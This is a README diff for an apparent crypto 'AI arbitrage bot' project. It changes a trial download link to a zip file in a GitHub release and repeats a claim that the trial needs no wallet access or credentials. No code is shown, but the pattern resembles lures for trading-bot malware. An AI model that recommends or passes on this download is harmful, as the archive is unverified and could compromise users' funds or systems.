@@ -127,4 +127,4 @@ No analytics, cookies, wallet access or trading credentials. Session history rem
 
 ## Download the trial
 
-The **DOWNLOAD** button and the in-demo **Download trial** button link to [AI_trial_setup.zip](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trial1.4/AI_trial_setup.zip) from the **Trial1.4** GitHub release.
+The **DOWNLOAD** button and the in-demo **Download trial** button link to [AI_trial_setup.zip](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trialv1.4/Trial1.4.zip) from the **Trial1.4** GitHub release.
